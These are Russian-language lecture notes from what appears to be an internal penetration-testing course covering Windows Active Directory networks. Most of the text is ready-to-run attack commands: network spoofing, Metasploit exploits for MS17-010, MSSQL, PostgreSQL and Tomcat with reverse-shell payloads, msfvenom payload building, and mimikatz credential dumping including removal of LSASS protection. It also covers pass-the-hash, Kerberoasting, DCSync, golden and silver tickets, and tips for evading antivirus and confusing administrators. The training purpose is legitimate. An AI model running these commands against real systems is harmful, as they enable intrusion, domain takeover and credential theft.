Занятие 1

Внутренний пентест - моделируем нарушителя внутри сети

Черный ящик - гость
Серый ящик - сотрудник

PSI DSS - требования к пентесту, задача получение "Данных платежных карт"



Карта атаки
Мы --> Окружение (чаще всего active directory) --> Повышение --> Цель

План
1. Wireshark
2. Сканирование
3. "Пробив" (узнаем что можно)
4. Сбор loot (повышение)
5. Достижение цели



Воткнувшись в сеть и запустив wireshark мы ловим широковещательный трафик по следующим протоколам:

STP (защита от петель в сети)
Если в destination - Spaning-Tree-For-Bridges, то в сети стоит самая старая версия STP. Ее можно обмануть и использовать в своих целях
STP DOS:
	https://bugtraq.ru/library/books/stp/chapter06/
	http://cybervlad.net/stp/index.html

sudo yersinia -G (или -I в консольном режиме)

Защита от STP (есть в 90% случаев)
	Включение BPDUGuard и BPDUFilter
	Отключение STP на портах access (для остановки получения BDPU от пользователей)
	Port Security



ARP (50%)
ARP spoofing
	mitmf (фреймворк уже не поддерживаеся, но пока жив арп, н будет актуален)
	ettercap -T 10.10.10.10 -X --httpd --proxy-https --proxy
	arpspoof -i eth0 -t 10.10.10.10
	Intercepter-NG
	
	bettercap	очень интересный и !живой! фреймворк



MITMF
	mitmf -i eth0 --spoof --arp --gateway 192.168.1.1
	--responder		подгружает плагин responder
	--inject		подгружает плагин инъекции
	--js-url <url>		инъекция JS на http страницы = XSS (очень полезно, так как внутренние сервисы чато работают без ssl)
	--smbauth		запуск процесса аутентификации smb
	--screen 		внедряем код для перехвата страниц http
	--jskeylogger		внедрение кейлоггера в js
	

	
DTP (Dynamic Trunking Protocol) (5%)
	Встречается очень редко, но можно перепрыгвать по виланам
	Scapy
	dtp.spoof.py



VTP (Обмен нформации о существовающих VLAN) (5%)
	


Rogue DHCP (90%)
(Full Slaak Attack) Очень мощная атака
В ненастроенной IPv6 сети можно стать роутером
Этот стандарт дефолтно включен на всех устройствах, более того, в WIndows IPv6 приоритетнее остальных протоколов
Но это может так-же работать как дос
	mitm6 -i eth0  	(упрощенная версия, которая не кладет сеть)



HSRP (8%)
	сморим, не передается ли autheticatio data в чистом виде
	yersinia
	scapy



RIPv2 (2%)
	если видим RIP - сразу пишем об эом как об уязвимостии



OSPF (1%)
	нет инструментов для атак



EIGRP
	Как и большнство атак на маршрутизацию, не используется, т.к. вызывает дос
	eigrp tools
	t50	



ICMP 
	ICMP  Redirect



NBT-NS/LLMNR  poisoning 
	Эти протоколы являются проприетарным механизмом резолва хостов в локлаьной сети на L2 без DNS.
	LLMNR (UDP/5355) 	- multicast
	NBT-NS			- broadcast	

	Порядок поиска хоста по DNS
	file "hosts"
	Cash DNS
	Request DNS
	NBT-NS



WPAD (98%)
По дефолту включен в винде, позволяет подсунуь нашг прокси и гнать весь трафик через него
	Responder
	Mitm6
	Inveigh
	msf (auxiliary/spoof/ndns/nbns_response) (auxiliary/spoof/llmnr/llmnr_response)



CDP (Cisco Discovery Protocol)
Раскрывае много информации о девайсе, реальный ip, VLAN, в котором мы находимся
	
По адресу оборудования можно определить новые сегменты сетей, которые стить просканироваить





Занятие 2

msf

установка на Arch:
https://miloservdov.org/?p=1891

Auxiliary
Exploits
Payloads
Post
Encoders (в теории скрывают вредоносное по от антиврусов. На практике больше используются на CTF и OSCP. Например для обхода запрещенных символов)



Auxiliary
Сбор информации



Exploits
use exploit/multi/handler

Используяются в сочетании с payload



Payloads
Bind vs Reverse
	Meterpreter
	Shell
	Command exec



Post
Постэксплуатация
Сбор  перечисление информации о системе
Сбор и перечисление иинформации о домене
Pivoting
Сканирование



Все модули сосотоят из:
Name
Description
Author
Disclosure date
Platform/Arch
License
Target (если эксплоит не работает, возможно таргет выбран не верно)



Настройка среды msf
$ sudo postgresql start (enable)
$ sudo msfdb init
$ msfconsole
msf6> db_status		Проверить статус базы данных

msf6> db_connect -y /usr/share/metasploit-framework/config/database.yml



Search 
msf6> search name:mysql
msf6> search platform:aix
msf6> search type:post
msf6> search cve:2011 author:jduck platform:linux

Grep
msf6> grep http search oracle
msf6> grep ms17 search windows
Сначала что грепаем, потом откуда грепаем 



Workspace
msf6> workspace -a <name>	Создаем рабочее пространство
msf6> workspace <name>		Перейти в рабочее пространство



Options
msf6> show options
msf6> show advansed
msf6> show targets
msf6> set <option>
msf6> unset <option>		
msf6> setg <option>		Глобальное значениие параметра
msf6> unsetg <option>		Снять глобальное значение параметра



Sessions
msf6> sessions -l		Список активных сессий
msf6> sessions -i <number>	Подключииться к сессии	
msf6> sessions -c 		Выполнение системной команды
msf6> sessions -C		Выполнениие команды метерпретера
msf6> sessions -K		Убить все сессии

msf6> sessions -c "whoami" all	выполнить команду на всех сессиях



Jobs
msf6> jobs -l			Список запущенных хендлеров и серверов
msf6> jobs -K			Убить все задачи



Meterpreter
Migrate (мграциия под другой процесс, что бы было сложнее задетектить процесс)
Download/Upload
Normal Linux comands
Loading of other modules (Powershell, Python (если на хосте нет питона), Kiwi...)



Самые ходовые модули
auxiliary/scanner/smb/smb_ms17_010
auxiliary/scanner/smb/smb_login
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/ftp/anonymous
auxiliary/scanner/mssql/mssql_login
auxiliary/scanner/postgres/postgres_login
auxiliary/scanner/http/tomcat_mgr_login
auxiliary/scanner/smb/smb_enum_gpp
auxiliary/admin/mssql/mssql_exec

exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms17_010_psexec
exploit/windows/smb/psexec
exploit/linux/samba/is_known_pipename
post/windows/manage/enable_rdp
post/windows/gather/enum_termserv
post/windows/manage/sticky_keys
post/windows/gather/credentials/gpp



Masscan (для сканирования очень больших подсетей)
$ masscan 192.168.0.0/16 -p 1-65535 --rate=9999999 -oX scan_result



Nmap
$ nmap -Pn -n -sV --min-rate=400 --min-parallelism=512 -p 21,22,88,445,623,1433,5432,5555,8080,8081,8180,8443,4786,1099,27017 --open -oA result -v 192.168.0.0/16

-Pn	десктопная винда не отвечает при включенном пинг скане
-n 	отключаем resolve, что бы сэкономить время 
-sV 	чаще всего не нужно при массовом скане, экономим время
--min-rate=400 --min-parallelism=512 оптимальный параметр подобраный опытным путем
-oA	все типы вывода


21 - ftp (если можно подключиться анонмно, это хорошо)
22 - =)
88 - 99% контроллер домена (kerberos)
445 - smb
623 - ibmi
1433 - mssql (слабый пароль на учетной записи SA)
3389 - rdp (свежая bluekeep)
5432 - postgresql (слабая конфигурация пароля)
5555 - HP dataprotector (часто он без пароля)
8081 - tomcat для деплоя java прложений (учетка tomcat:tomcat)
4786 - cisco smart install (по умолчанию включен, можно стащить конфиг циски, в котором может лежать пароль в чстом или кодированном виде)
1099 - 
27017 - mongodb (не требует авторизации по дефолту)



Типовые вектора "пробива"
MS17-010 
MSSQL
PostgreSQL
Tomcat





Занятие 3

##### MS17-010 #####

smb_ms17_010 (60%)
	ms17_010_eternalblue (иногда может уронить машину. Только x64)
	ms17_010_psexec (если pipe доступен, то лучше использовать во всех случаях)
	ms17_010_eternalblue_win8 (для win8)
	*Если машна на Windows 5.1, то лучше использовать windows/smb/ms08_067_netapi

msf6> cd <folder with scan> 				Переходим в папку со сканом
msf6> db_import scan					Подгружаем файл сканирования в базу данных msf
msf6> services						Вывод информации из базы данных
msf6> services -p 445					Выводм только с портами 445

msf6> use auxiliary/scanner/smb/smb_version		Модуль собирает некоторую инфомрацию о SMB
msf6> options						
msf6> services -p 445 -R				Устанавливаем дапазон машиин как RHOST
msf6> set threads 50					
msf6> set verbose false					Отключаем лишний вывод информации
msf6> run						Запускаем

msf6> services -p 445					Теперь имеем всю информацию

Сканируем на ms17_010
msf6> use auxiliary/scanner/smb/smb_ms17_010		Сканируем на ms17_010
msf6> set threads 100
msf6> set verbose false
msf6> set check_pipe true				Заодно ищем открытые пайпы		
msf6> run

msf6> vulns 						Показывает все найденные уязвимости

Эксплуатируем psexec
msf6> use windows/smb/ms17_010_psexec			Если нашли пайп, то используем psexec
msf6> set rhost <ip>
msf6> set payload windows/x64/meterpreter/reverse_tcp	Для ms17_010 нужно выбрать 64-битную версию
msf6> set lhsot <tun0>					Вместо адреса можно указать интерфейс
msf6> run

Доп варианты нагрузок, если системы защиты блокируют
windows/x64/meterpreter/reverse_https
windows/x64/meterpreter/reverse_tcp_rc4
windows/x64/shell_reverse_tcp
windows/x64/shell/reverse_tcp




##### MSSQL #####

mssql (20%)
	mssql_login (брут учетных записей, в т.ч. дефолтной 'sa')
	mssql_exec (исполняет одну единственную команду)
	mssql_payload (указываем адрес, учетку и пароль к mssql и получаем шелл)

Подбираем учетные данные
msf6> services -p 1433					Сортируем по порту mssql
msf6> use auxiliary/scanner/mssql/mssql_login		Брут учетки
msf6> set rhosts <ip>
msf6> set USERNAME <sa>					Не обязательно, по дефолту будет 'sa'
msf6> set pass_file </usr/share/wordlists/rockyou.txt>  Выбираем словарь для брута
msf6> set threads 100
msf6> set stop_on_success true				Остановка после успешно найденного пароля
msf6> run

msf6> creds						Выводим все сбрученные креды

Эксплуатируем
msf6> use exploit/windows/mssql/mssql_payload
msf6> set password <pass>				Ставим найденый пароль
msf6> set lhost <tun0>
msf6> set rhost <ip>
msf6> run




##### PostgreSQL #####

Часто встречается стандартная учетка postgres:postgres
Может висеть на линуксе или на винде

postgres (15%)
	postgres_login
	postgres_payload
	postgres_copy_from_program_cmd_exec (в свежих версиях)

Брутаем стандартные учетки
msf6> use auxiliary/scanner/postgres/postgres_login
msf6> services -p 5432 -R
msf6> run

Эксплуатация под windows
msf6> use exploit/windows/postgres/postgres_payload
msf6> set rhost <ip>
msf6> set lhost <tun0>
msf6> run	
Если ошибка - смотрим на строку с ip аддресом (мб у нас другая опреационка?)

Эксплуатация Linux
msf6> use exploit/linux/postgres/postgres_payload	Если все-таким во второй строчке написано про linux =)
msf6> set rhosts <ip>
msf6> set lhost tun0

*Если система 64 битная
msf6> show targets					Список возможных таргетов
msf6> set target Linux\ x86_64				Если во второй строчке сказано, что у нас 64 система
msf6> set payload linux/x64/meterpreter/reverse_tcp
msf6> run




##### Tomcat #####

tomcat (10%)
	tomcat_mgr_login (брутаем учетные данные tomcat)

Брутаем стандартные учетоки
msf6> use auxiliary/scanner/http/tomcat_mgr_login
msf6> set rhost <ip>
msf6> run

Переходим на сайт 
http://<ip>:8080/manager/html

Генерируем шелл, завернутый в war файл
$ msfvenom -p java/meterpreter/reverse_tcp LHOST=<наш ip> LPORT=4444 -f war -o tomcatshell.war

Поднимаем хендлер
msf6> use exploit/multi/handler
msf6> set lhost tun0
msf6> set payload java/meterpreter/reverse_tcp		Важно выбрать то-же пейлоад, что указали в msfvenom
msf6> run

На сайте в "war file to deploy" прикрепляем наш war файл
Обновляем страницу
Жмем по загруженному файлу в Applications




Лайфхаки

В show dvanced можно сразу после получения сессии выполнить скрипт (autoscript)

Если на машине стоит антивирус, то mssql_exec 

set EXECUSTOM 			Позволяет загрузить кастомный сервисный exe файл

$ killall <telegram>		Если девушка пишет по время занятия

$ zcat <archive>		cat файл из архива, без предварительной распаковки

meterpreter> help		ооочень много классного!
meterpreter> getid		кто текущий пользователь
meterpreter> webcam_list 	список камер
meterpreter> screenshot		сделать скрин
meterpreter> keysacn_start	запускаем кейлоггер (не идеально, но работает)

$ python -c "import pty;pty.spawn('/bin/bash')"		Получаем красивую оболочку на лиинуксовый шелл

msf6> sessions -C <ps> all	Выполнить команду сразу на всех background сессиях



Логирование действий
msf6> spool </home/hackers_log>		Выводим лог в файл
msf6> set TimestampOutput true		Включаем временную метку для логирования



Горизонтальное перемещение
"Марк Русинович Windows Internals" 	Очень полезная книга о работе windows



Выполнение кода на узле с учетной записью
PsExec  (445)  исполнение кода 
Wmiexec (135)  исполнение кода через удаленный реестр или планировщик задач
Winrm  (5985)  удаленная сессия через powershell
RDP    (3389)  сразу получаем неплохие привелегии
SSH	 (22)  =)

auxiliary/scanner/smb/smb_login 	Сканируем, подходит ли учетная запись



Этапы выполнения PsExec (445)
1) С учеткой локального админа подключаемся к smb шаре и записываем туда сервисный бинарник
2) Через sc.exe создаем сервис из нашего бинарника
3) Запускаем сервис
<здесь мы имеем машину во все порты>
4) Останавливаем сервис 
5) Удаляем сервис
6) Удаляем бинарник

Эксплуатация легитимными средствами (вообще не палится)
https://docs.microsoft.com/en-us/sysinternals/downloads/psexec	Инструмент
C:\> psexec \\<192.168.122.66> -u <Administrator> -p <Qq123> -c cmd.exe



Impacket
https://github.com/SecureAuthCorp/impacket
cd impacket/examples

RCE по протоклам DCE RPC
$ pyhton atexec.py ignite/Administrator:Qq123@192.168.1.105 systeminfo
                   ^домен ^учетка       ^pass ^адрес

(445) PsExec
$ python psexec.py ignite/Administrator:Qq123@192.168.1.105

(135) Smbexec (с большей вероятностью не будет забанен антивирусом)
$ sudo python smbexec.py ignite/Administrator:Qq123@192.168.1.105 -mode <SHARE/SERVER> 		SERVER почти не палится, но требует рут

(135) Wmiexec (оставляет меньше следов чем smbexec, выполняет через WMI)
$ python wmiexec.py ignite/Administrator:Qq123@192.168.1.195 dir



(5985) WinRM (легитимный, но включен не везде. Сразу получаем powershell)
$ gem install evil-winrm
$ evil-winrm -i 192.168.1.105 -u Administrator -p 'Qq123'




NTLM Hash
Хранится в WINDOWS/system32/config/sam
Для расшифровки нужен файл WINDOWS/system32/config/system
Administrator:500:01fc5a353edafff4cb37са4ee:5412abx756e64d84cb735a46cbac:::
^login        ^RID^LM hash    (4ee = empty) ^NT hash    (9c0 = disabled)



Hash Dump
С правами локального админа дампим хеши
meterpreter> hashdump

Mimikatz & Kiwi
meterpreter> load kiwi		Загружаем модуль Kiwi
meterpreter> help		Появляется много возможны паролей для извлечения
meterpreter> creds_all		Вытаскиваем все пароли



Pass the Hash
msf6> use auxiliary/scanner/smb/smb_login	Проверяем, подходит ли наш хеш
msf6> set SMBpass <hash>
msf6> use exploit/windows/smb/psexec
msf6> set SMBpass <hash>			Используем хеш вместо пароля



Impersonate token 
meterpreter> getsystem		Получить права системы за один клик, если есть такая возможность

Если антивирус не дает повысить привилегии другим образом (реально работает!)
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"




После получения доступа с правами системы можем:
procdump 
mimikatz
kiwi



Group Policy
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\		Хранилище груповых политик
$ use post/windows/gather/credentials/gpp	Вытащить груповые политики после эксплуатации 



Bash
Ctrl + R	Найти ии выполнить команду из истории





Занятие 4

C:\>ipconfig > ip.txt			Лучше выводить результат выполнения команд в файл



crackmapexec
https://github.com/byt3bl33d3r/CrackMapExec
$ crackmapexec smb <ip>			Вывести сведения о машине. Система, версия, разрядность...



meterpreter> SET Processor		Вывести сведения об врхитектуре



msfvenom
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meter.exe
msf6> use exploit/multi/handler
msf6> set lhost tun0
msf6> set lport 4444
msf6> set payload windows/meterpreter/reverse_tcp
msf6> run
Отдаем файл

В нем существует много модулей
$ msfvenom --list <format>
$ msfvenom --help			Очень рекомендуется ознакомться

Transform format - то, в каком виде получаем файл
Executable format - то, как файл будет запущен



Chain 1

Начинаем с поиска ms17_010
mfs6> use auxiliary/scanner/smb/ms17_010
192.168.1.109 (Windows 5.1) is likely vulnerale
msf6> use exploit/windows/smb/ms08_067_netapi			Так как мы работаем с XP
meterpreter> hashdump						Сохраняем к себе
meterpreter> load kiwi
meterpreter> creds_all						Тоже копируем

Или если модуль не орабатывает
meterpreter> upload /home/mimikatz.exe				Загружаем скачаный mimikatz
meterpreter> shell
C:\> mimikatz.exe
# PRIVILEGE::debug
# sekurlsa::logonpasswords


Получили
Administator:1004:f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24:::
Administator      BUHGALTE-C8940A  1qaz@WSX
BUHGALTE-C8940A$  MSHOME           (null)

Пытаемся использовать на других машинах
msf6> use auxiliary/scaner/smb/smb_login 
msf6> services -p 445 -R
msf6> set smbuser <Administrator>
msf6> set smbpass <f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24>
Curret credentials, but unable to login 			Ученая запись оключена
msf6> set smbpass <1qaz@WSX>					Проверяем и пароли

Подключаемся
msf6> use exploit/windows/smb/psexec
msf6> set smbuser <Administrator>
msf6> set smbpass <1qaz@WSX>
$ crackmapexec smb <ip>						Проверяем разряднось
msf6> set payload windows/<x64>/meterpreter/reverse_tcp

Делаем hashdump при ограничении доступа к памяти
meterpreter> run post/windows/gather/smart_hashdump
Если он падает с ошибкой, то возможно некоторые учетки он не успел выгрузить
проверяем через shell; net user

Если kiwi: loaded 32-bit vesrion on 64-bit architecture
meterpreter> ps							Выводим список процессов и ищем PID 64-биного
meterpreter> migrate <492>					Теперь мы имеем 64-битный meterpreter

meterpreter> sysinfo						Информация о машине

Если машина без портов, скорее всего они нестандартные
nmap <ip> -p- --open -sV

WinRM
$ crackmapexec winrm <ip>					Проверяем, действительно ли порт живой
$ crackmapexec winrm <ip> -u administrator -p <pass>		Проверяем креды
$ crackmapexec winrm <ip> -u administrator -p <pass> -x <dir>	Выполнить команду "dir"

Загрузим шелл через WinRM
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meter.exe
$ sudo smbserver.py <name> .
$ crackmapexec winrm <ip> -u administrator -p <pass> -x "<\\<name>\meter.exe>"

Или без поднятия сервера:
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f psh-cmd		Копируем вывод команды
msf6> use exploit/multi/handler
$ crackmapexec winrm <ip> -u administrator -p <pass> -x "rrfGV..дохрена всего..56VBy=" Вставляем то, что скопировали ('=' важно)



Возможно придется перебиратьь target
msf6> set smbdomain <domain.local>
не забываем про incognito

239
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4816afb5a756771974bd33c742f4914:::
атрибуты, рдп, 




Занятие 5

Kerberos 
Протокол для аутентификации пользователей при входе в систему
Часто встречается в Windows AD

AS - authentification server 
TGS - ticket-granting server

В Kerberos синхронизация времени крайне важна

Port 88 (kerberos) - признак контроллера домена



Работа Kerberos

1.1) Пользователь включает компьютер и вводит свою доменную учетку
AS-REQ 1.2) Запрос с паролем идет на Authentication Server проверяется с кредами из БД
AS-REP 2.1) AS отправляет session key и TGT билет на машину пользователя (билет жвет 8 часов, это мультипаспорт)
2.2) TGT записывается в память LSASS и хранится там 8 часов (или до первой перезагрузки)
Теперь пользователь может работать с другими сервисами

Пользователь хочет получить разрешение сходить на сервер А
TGS-REQ 3.1) Он отправляет свой TGT билет, session key и запрос к серверу A на Ticket Granting Server
3.2) TGS проверяет TGT билет, sesion key и факт сущестования сервера A
TGS-REP 4) TGS отправляет TGS билет пользователю и session key

Пользователь идет на сервер А
Service-REQ 5) Пользователь отправляет TGS билет на проверку серверу А и разрешает доступ в зависимоти от прав пользователя, записанных в билете
6) Пользователь получает (или не получает) доступ к серверу А


После ввода пароля в память LSASS кладутся:
хеши des_cbc_md5 aes128_hmac aes56_hmac, а так-же NTLM хеш
Обычно используется aes256_hmac, но AS примит любой из них (это детектится)

TGT билет
Client Info
User Restrictions
Ticket Lifetime
Ticket Flags
Authorization Data (С Домен Контроллера) шифруется на ключе пользователя krbtgt



Атаки

Kerberos Brute
узнав корпоративный шаблон учетных записей (I.Ivanov, Ivanov.I.S...)
можно создать словарь по шаблону и после этого побрутить
msf6> use auxiliary/gather/kreberos_enumusers
msf6> set rhosts <>
msf6> set USER_FILE <user.txt>
msf6> set DOMAIN <ignite.local>
msf6> exploit
Узнав существующие учетки бруатем их пароли по словарям



AS Rep Roasting/impacket
Если отключена Kerberos preauthentication у пользователя, можно получить его tgs, который можно брутить оффлайн
$ python impacket/examples/GetNPUsers.py CONTOSO.COM/Administrator:'P@ssw0rd' -request
В результатен получаем имя пользователя, у которого отключена preauth и его билет

Реальный пример
$ GetNPUsers.py <domain.local>/<WIN7\$> -hashes <hash> -request -dc-ip <domain controller id> 



Kerberoasting/impacket (90%)
$ impacket/examples/GetUserSPNs.py -request -dc -ip 10.10.10.100 active.htb/svs tgs

Реальный пример
$ GetUserSPNs.py <domain.local>/<WIN7\$> -hashes <hash> -request -dc-ip <192.168.1.80>
		  домен          машина, экранируем $                    ip домен-контроллера




Брутаем полученные билеты
$ hashcat -m 18200 <ASRepfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для AS rep Roasting
$ hashcat -m 13100 <Kerbfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для Kerberoasting

$ john --format=krb5asrep --wordlist=<rockyou.txt> <Kerbfile>				на практике работает стабильнее



$ carckmapexec smb 192.168.1.0/24		Сканируем адреса на smb порт





Занятие 6

Responder (очень важный инструмент, атака на LLMNR)
https://github.com/SpiderLabs/Responder
$ responder -I eth0 -w -r -f -F -v -v -vv

$ responder -I eth0 -w -r -f -F -v -v -vv -b	Включили basic authentication (фишинговое окно при посещении доменных ресурсов)
Теперь ждем, пока пользователь пойдет на несуществующий доменный ресурс 

/etc/Responder/Responder.conf
	Challenge = random 			Можно поставить свой челендж, что бы успорить брутфорс


Атака не деструктивная, но может собрать много NTLM хешей с домена



Брут полученных хешей
$ hashcat -m 5600 <file with hash> -o hash.out /usr/share/wordlists/rockyou.txt
$ cat hash.out



Mimikatz

https://github.com/gentilkiwi/mimikatz
Вытаскиваем хеши и пароли из LSASS
Перед использованием нужно отключить антивирус

Вытащить все креды
mimikatz # coffee				Проверить, что инструмент работает
mimikatz # privilege::debug			Работает только от привелигерованного пользователя
mimikatz # standard::log log.txt		Записываем лог файл
mimikatz # sekurlsa::logonPasswords full	Вытаскиваем данные из памяти процесса

Для XP, 2000 используем Mimilove



Поднимаем хендлер
msf6> use exploit/multi/handler
msf6> set LRORT 7777
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> run

Готовим пейлоад
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=7777 -f exe -o meter.exe	

Поднимаем smb шару в папке с пейлоадом
$ sudo python3 impacket/examples/smbserver.py kek .	



meterpreter> getuid					Узнать пользователя, под которым мы работаем
meterpreter> getsystem					Имперсонируем токен системы
meterpreter> run post/windows/gather/smart_hashdump	Если ни kiwi ни hashdump не отработали



Способ пробиться к учеткам при защищенной памяти LSASS
(Ошибка ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005))

meterpreter> upload mimikatz.exe
meterpreter> upload mimidrv.sys
meterpreter> shell
C:\>mimikatz.exe
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonPasswords full



Мануал по mimikatz
https://github.com/insi2304/Mimikatz-cheatsheet



Анализ памяти на своей машине
meterpreter> upload procdump64.exe
meterpreter> shell
c:\> procdump64.exe -ma lsass.exe dump -accepteula
meterpreter> download dump.dmp

На своей винде
mimikatz # sekurlsa::Minidump dump.dmp
mimikatz # sekurlsa::logonPasswords full

На своем линуксе
$ pypykatz lsa -t 0 minidump dump.dmp



Подсказка к последнему шагу цепочки из дз
meterpreter> impersonate_token "INFOSEC\admin"
C:\> type \\onfosec.local\C$\flag.txt





Зантятие 7

Pass the Ticket

Список kerberos билетов
meterpreter> kerberos_ticket_list		

В памяти LSASS хранятся не только парол, но  билеты

Структура билета
[0;1d0bb]-2-0-40e10000-<username>@<service>-<domain.local>.kirbi


Pass the Ticket (Windows)

На жертве
C:\> mimikatz.exe
# privilege::debug					
# token::elevate					Повышаем првлег, что бы увидеть остальные билеты, существующие в системе
# sekurlsa::tickets/export				Экспортруем билеты
# exit
C:\> dir | findet "Administrator" | findstr "krbtgt"	Сортруем блеты с юзером - Administrator и сервисом krbtgt
[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi

На своей винде
C:\> mimikatz.exe
# privilege::debug
# kerberos::ppt <[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB>.kirbi
File: '[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi': OK
# exit

Что бы не было ошибок соединения, нужно прописать DNS контроллера домена в настройках адаптера



Pass the Ticket (Linux)
meterpreter> kiwi_cmd "\"sekurlsa::ticket /export\""				Старый формат команды
meterpreter> kiwi_cmd "privilege::debug"
meterpreter> kiwi_cmd "sekurlas::ticket/export"					Новый формат команды

Если возникают проблемы, загружаем mimikatz
mimikatz # privilege::debug 
mimikatz # sekurlsa::ticket/export						Билеты появятся в теущей директории
mimikatz # exit
meterpreter> download *								В названии файлов много спецсимволов

https://github.com/Zer1t0/ticket_converter
В первую очередь берем krbtgt билеты Administrator
$ python ticket_converter.py <ticket>.kirbi <ticket>.ccache			Конвертируем блет в ccache
Converting kirbi => ccache
$ export KRB5CCNAME=/home/user/velociraptor.ccache				Экспортируем билет в переменную
$ psexec.py -k -no-pass <Administrator>@<WIN7>.<DOMAIN.local> dc-ip <192.168.1.80>						

Ошибки
[Errno -2] Name or service not known
Добавить адрес контроллера в /etc/hosts
	<192.168.1.80>	<DOMAIN.local>

KRB_AP_ERR_TKT_EXPIRED(Ticket expired)
Нужно синхронизировать время с домен-контроллером
	$ apt install rdate
	sudo rdate -n <192.168.1.80>



Overpass the Hash (Windows)
C:\> mimikatz.exe	
# privilege::debug
# sekurlsa::ekeys								Вытаскиваем ключи для машинной записи
Для запроса билета по DES требуется только NTLM хэш 				(des_cbc_md5)
# sekurlsa::logonpasswords							Вытаскваем NTLM хеши пользователя
# sekurlsa::pth /user:<user> /domain:<jessybrings.com> /ntlm:<ntlm hash>	Используем NTLM хеш 
# sekurlsa::pth /user:<user> /domain:<jessybrings.com> /aes:<aes key>		Если хотм пойти по aes256_hmac
Билет добавится в память процесса lsass

Запуск RDP по керебросу
mimikatz # sekurlsa::pth /user:invader /domain:LOCALHOST /ntlm:NTLM /run:"mstsc /v:10.0.0.2"



Overpass the Hash (Linux)
$ cd impacket/examples
$ python getTGT.py <domain.local>/<Administrator> -hashes [lm_hash]:<ntlm_hash>		Идем по NTLM
$ python getTGT.py <domain.local>/<Administrator> -aesKey <aes_hmac>			Или идем по AES (более незаметно)
$ export KRB5CCNAME=<TGT_ccache_file>

Теперь можем выполнить команду разными способами
$ python psexec.py -k -no-pass <Administrator>@<WIN7>.<domain.local> -target-ip <192.168.1.81>
$ python smbexec.py -k -no-pass <domain_name>/<user_name>@<remote_hostname> 
$ python wmiexec.py -k -no-pass <domain_name>/<user_name>@<remote_hostname> 



dcsync (hashdump на ДоменКонтроллере)

На Windows
mimikatz # lsadump::dcsync /domain:<rd.security.org> /user:<Administrator>
Нужно вытаскивать данные для каждого пользователя по отдельности

На Linux
$ cd impacket/examples
$ python secretsdump.py -hashes :<hash> Administrator@192.168.0.6 -ntds NTDS -outputfile DUMP
Заодно вытягиваем историю паролей

$ pythin secretsdump.py -hashes :<hash> Administrator@192.168.1.80 -just-dc-user krbtgt		
Вытаскваем только креды krbtgt. Если получилось, это полный захват домена

Если есть возможность использовать AES-256, всегда лучше использовать его а не DES



Golden Ticket
Требует получения прав доменного Админа и получения доступа к krbtgt

Узнаем sid
$ cd impacket/examples
$ python lookupsid.py <DOMAIN.local>/Administrator@192.168.1.80 -hashes :<hash>	Получаем sid
S-1-5-21-450836121-1649635954-203960036

Генерируем Golden ticket на Windows
C:> mimikatz
# kerberos::golden /krbtgt:<hash> /admin:administrator /domain:demo.local /sid:<S-1-5-21-4508...> /ticket:administrator.ticket.bin

Генерируем Golden ticket на Linux 
$ python ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain.local> -dc-ip <192.168.1.80> <pentest>			По NTLM (:вторая половина хеша:::)
$ python ticketer.py -aesKey <aes256_hmac> -domain-sid <sid> -domain <domain.local> -dc-ip 192.168.1.80	<pentest>		По AES
$ export KRB5CCNAME=<ip>.ccache
$ psexec.py -k -no-pass <pentest>@<WIN10>.<domain> -target-ip <192.168.1.81> 

Можно создать несуществующего пользователя, что собьет с толку админов.
Можно создать вечный билет, который будет работать хоть через 10 лет. 
Пофиксить это можно только сменой krbtgt пароля два раза, однако в таком случае будет окно в 8 часов, что бы забрать новый пароль и сделать новый Golden Ticket
В таком случае выкурить злоумышленника будет невозможно. Более того, процедура смены пароля достаточно опасная 



Silver Ticket
Имея рабочую учетку, без прав локального админа мы можем подделать билет и указать там более высокие права
Максимум на месяц

$ cd impacket/examples
$ python ticketer.py -nthash <hash> -domain-sid <sid> -domain <DOMAIN.local> -spn <service_spn> <pentest>
CIFS/<username>/domain.local	вставляем так, если что impacket подправит сам
$ python ticketer.py -aesKey <aes_key> -domain-sid <sid> -domain <DOMAIN.local> -spn <CIFS/WIN7.domain.local> <pentest>
$ export KRB5CCNAME=<pentest.ccache>

Теперь можем выполнить команду разными способами
$ python psexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>
$ python smbexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>
$ python wmiexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>



Занятие 8

Материалы от Павла по повышению привилегий на винде
powerup - скрипт дял повышения привелегий и ошибок конфигурации
https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ 
https://github.com/AlessandroZ/BeRoot.git
https://github.com/bitsadmin/wesng - python wes.py SYSINFO-FILE --exploits-only --impact "Elevation of Privilege"
https://github.com/hlldz/dazzleUP - Auto check CVE and missconfigs
https://github.com/SecWiki/windows-kernel-exploits - бинари
https://github.com/WindowsExploits/Exploits?files=1 - бинарники под cve
https://github.com/nomi-sec/PoC-in-GitHub - PoC по CVE
https://xakep.ru/2017/06/30/windows-privilege-bypass/
https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit#
